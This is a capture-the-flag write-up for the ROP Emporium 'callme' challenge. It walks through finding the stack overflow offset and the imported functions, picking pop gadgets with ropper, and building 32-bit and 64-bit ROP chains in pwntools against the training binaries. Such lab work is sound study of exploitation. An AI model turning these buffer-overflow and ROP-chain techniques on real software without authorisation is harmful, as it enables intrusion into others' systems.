# callme | ROPEmporium

```bash
kali@kali:~/Desktop/rop/callme$ checksec --file=callme32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   75) Symbols       No    0               3               callme32
```

## Steps
### 1. Investigate binary
The first thing is to find where the functions are that I'll have to call.
```bash
kali@kali:~/Desktop/rop/callme$ rabin2 -iR callme32
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080484c0 GLOBAL FUNC       read
2   0x080484d0 GLOBAL FUNC       printf
3   0x080484e0 GLOBAL FUNC       callme_three
4   0x080484f0 GLOBAL FUNC       callme_one
5   0x08048500 GLOBAL FUNC       puts
6   0x00000000 WEAK   NOTYPE     __gmon_start__
7   0x08048510 GLOBAL FUNC       exit
8   0x08048520 GLOBAL FUNC       __libc_start_main
9   0x08048530 GLOBAL FUNC       setvbuf
10  0x08048540 GLOBAL FUNC       memset
11  0x08048550 GLOBAL FUNC       callme_two

[Relocations]

vaddr      paddr      type   name
―――――――――――――――――――――――――――――――――
0x08049ffc 0x00000ffc SET_32 __gmon_start__
0x0804a00c 0x0000100c SET_32 read
0x0804a010 0x00001010 SET_32 printf
0x0804a014 0x00001014 SET_32 callme_three
0x0804a018 0x00001018 SET_32 callme_one
0x0804a01c 0x0000101c SET_32 puts
0x0804a020 0x00001020 SET_32 exit
0x0804a024 0x00001024 SET_32 __libc_start_main
0x0804a028 0x00001028 SET_32 setvbuf
0x0804a02c 0x0000102c SET_32 memset
0x0804a030 0x00001030 SET_32 callme_two
0x0804a03c 0x0804a03c SET_64 stdout


12 relocations
```
In the import table I can see the callme_one, callme_two and callme_three functions that need to be called in order with their arguments. I'll also run the program and take a look at memory. Due to lazy binding I can't see what's going on inside the callme functions until they are actually called.
```bash
[0x08048686]> db 0x08048739
[0x08048686]> dc
callme by ROP Emporium
x86

Hope you read the instructions...

> TEST
hit breakpoint at: 8048739
[0x08048739]> dr
eax = 0x00000005
ebx = 0x00000000
ecx = 0xfff31210
edx = 0x00000200
esi = 0xf7ebc000
edi = 0xf7ebc000
esp = 0xfff31200
ebp = 0xfff31238
eip = 0x08048739
eflags = 0x00000282
oeax = 0xffffffff
[0x08048739]> px 200 @esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xfff31200  0000 0000 1012 f3ff 0002 0000 0400 0000  ................                                                                                                
0xfff31210  5445 5354 0a00 0000 0000 0000 0000 0000  TEST............
0xfff31220  0000 0000 0000 0000 0000 0000 0000 0000  ................
0xfff31230  3788 0408 0000 0000 4812 f3ff d086 0408  7.......H.......
0xfff31240  4021 eff7 6012 f3ff 0000 0000 f1ae cff7  @!..`...........
0xfff31250  00c0 ebf7 00c0 ebf7 0000 0000 f1ae cff7  ................
0xfff31260  0100 0000 f412 f3ff fc12 f3ff 8412 f3ff  ................
0xfff31270  0100 0000 0000 0000 00c0 ebf7 0000 0000  ................
0xfff31280  00b0 f0f7 0000 0000 00c0 ebf7 00c0 ebf7  ................
0xfff31290  0000 0000 0592 27c5 1534 5ebc 0000 0000  ......'..4^.....
0xfff312a0  0000 0000 0000 0000 0100 0000 7085 0408  ............p...
0xfff312b0  0000 0000 c072 eff7 4021 eff7 00a0 0408  .....r..@!......
0xfff312c0  0100 0000 7085 0408
```
Here I can see that there is 32 bytes of null'd out buffer space, followed by a return address. Just to verify the position of EIP I need to overwrite I'll get a segfault and check.
```bash
kali@kali:~/Desktop/rop/callme$ python -c "from pwn import cyclic; print(cyclic(50))" | ./callme32 
callme by ROP Emporium
x86

Hope you read the instructions...

> Thank you!
Segmentation fault
kali@kali:~/Desktop/rop/callme$ sudo dmesg -t
callme32[5642]: segfault at 6161616c ip 000000006161616c sp 00000000ffb17b00 error 14 in libc-2.30.so[f7d16000+1d000]
Code: Bad RIP value.
kali@kali:~/Desktop/rop/callme$ python -c "from pwn import cyclic_find; print(cyclic_find(0x6161616c))"
44
```

### 2. Construct a payload
Reference:
- https://en.wikipedia.org/wiki/X86_calling_conventions
  
In order to call the functions with arguments, I need a gadget to pop the argument off the stack into registers once I've called each function. I want any gadget with a pop, so I can search for one with ropper.
```bash
kali@kali:~/Desktop/rop/callme$ ropper --file callme32 --search pop
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: callme32
0x080487fb: pop ebp; ret; 
0x080487f8: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x080484ad: pop ebx; ret;
0x080487fa: pop edi; pop ebp; ret; 
0x080487f9: pop esi; pop edi; pop ebp; ret;                <------ This one
0x08048810: pop ss; add byte ptr [eax], al; add esp, 8; pop ebx; ret; 
0x080486ea: popal; cld; ret;
```
This one should do the job, as it allows me to supply three arguments to each function. I now have all the components needed to craft the exploit. I can create the script in pwntools using the ROP features, but for my understanding the exploit is as follows:
`44 bytes - callme_one - gadget - args - callme_two - gadget - args - callme_three - gadget - args`
  
In my exploit script I develop the rop chain using pwntools methods and also manually for my own understanding (see solve.py).

### 3. Get the flag
```bash
kali@kali:~/Desktop/rop/callme$ python solve.py 
[*] '/home/kali/Desktop/rop/callme/callme32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  '.'
[*] Loaded 10 cached gadgets for 'callme32'
[*] 0x0000:        0x80484f0 callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)
    0x0004:        0x80484aa <adjust @0x14> add esp, 8; pop ebx; ret
    0x0008:       0xdeadbeef arg0
    0x000c:       0xcafebabe arg1
    0x0010:       0xd00df00d arg2
    0x0014:        0x8048550 callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d)
    0x0018:        0x80484aa <adjust @0x28> add esp, 8; pop ebx; ret
    0x001c:       0xdeadbeef arg0
    0x0020:       0xcafebabe arg1
    0x0024:       0xd00df00d arg2
    0x0028:        0x80484e0 callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)
    0x002c:           'laaa' <return address>
    0x0030:       0xdeadbeef arg0
    0x0034:       0xcafebabe arg1
    0x0038:       0xd00df00d arg2
[+] Starting local process '/home/kali/Desktop/rop/callme/callme32': pid 3119
[+] Receiving all data: Done (104B)
[*] Process '/home/kali/Desktop/rop/callme/callme32' stopped with exit code 0 (pid 3119)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```
## Differences in architecture
For the x64 binary the process is similar. Firstly find the function addresses in the import table.
```bash
kali@kali:~/Desktop/rop/callme/x64$ rabin2 -iR callme 
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       puts
2   0x004006e0 GLOBAL FUNC       printf
3   0x004006f0 GLOBAL FUNC       callme_three
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00400720 GLOBAL FUNC       callme_one
8   0x00000000 WEAK   NOTYPE     __gmon_start__
9   0x00400730 GLOBAL FUNC       setvbuf
10  0x00400740 GLOBAL FUNC       callme_two
11  0x00400750 GLOBAL FUNC       exit

[Relocations]

vaddr      paddr      type   name
―――――――――――――――――――――――――――――――――
0x00600ff0 0x00000ff0 SET_64 __libc_start_main
0x00600ff8 0x00000ff8 SET_64 __gmon_start__
0x00601018 0x00001018 SET_64 puts
0x00601020 0x00001020 SET_64 printf
0x00601028 0x00001028 SET_64 callme_three
0x00601030 0x00001030 SET_64 memset
0x00601038 0x00001038 SET_64 read
0x00601040 0x00001040 SET_64 callme_one
0x00601048 0x00001048 SET_64 setvbuf
0x00601050 0x00001050 SET_64 callme_two
0x00601058 0x00001058 SET_64 exit
0x00601070 0x00601070 SET_64 stdout


12 relocations
```
And I also need a gadget to get the values into registers prior to calling the function. As the binary uses SystemV conventions, arguments are passed using registers RDI, RSI, RDX, R8 and R9 (see reference).
```bash
kali@kali:~/Desktop/rop/callme/x64$ ropper --file=callme --search pop
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: callme
0x000000000040099c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040099e: pop r13; pop r14; pop r15; ret; 
0x00000000004009a0: pop r14; pop r15; ret; 
0x00000000004009a2: pop r15; ret; 
0x00000000004007bb: pop rbp; mov edi, 0x601070; jmp rax; 
0x000000000040099b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040099f: pop rbp; pop r14; pop r15; ret; 
0x00000000004007c8: pop rbp; ret; 
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; <---- this one is perfect
0x00000000004009a3: pop rdi; ret; 
0x000000000040093e: pop rdx; ret; 
0x00000000004009a1: pop rsi; pop r15; ret; 
0x000000000040093d: pop rsi; pop rdx; ret; 
0x000000000040099d: pop rsp; pop r13; pop r14; pop r15; ret;
```
Just like the previous challenges, the offset for the x64 binary is 40 bytes. The ROP chain needs to be slightly different as the arguments need to be placed into registers before the function is called. Therefore the chain is constructed as follows:
`40 bytes + gadget + args + callme_one + gadget + args + callme_two + gadget + args + callme_three`
Create the exploit and run it.
```bash
kali@kali:~/Desktop/rop/callme/x64$ python solve.py 
[*] '/home/kali/Desktop/rop/callme/x64/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  '.'
[*] Loaded 17 cached gadgets for 'callme'
[*] 0x0000:         0x40093c pop rdi; pop rsi; pop rdx; ret
    0x0008: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023L
    0x0010: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854L
    0x0018: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653L
    0x0020:         0x400720 callme_one
    0x0028:         0x40093c pop rdi; pop rsi; pop rdx; ret
    0x0030: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023L
    0x0038: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854L
    0x0040: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653L
    0x0048:         0x400740 callme_two
    0x0050:         0x40093c pop rdi; pop rsi; pop rdx; ret
    0x0058: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023L
    0x0060: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854L
    0x0068: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653L
    0x0070:         0x4006f0 callme_three
[+] Starting local process '/home/kali/Desktop/rop/callme/x64/callme': pid 4149
[+] Receiving all data: Done (104B)
[*] Process '/home/kali/Desktop/rop/callme/x64/callme' stopped with exit code 0 (pid 4149)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```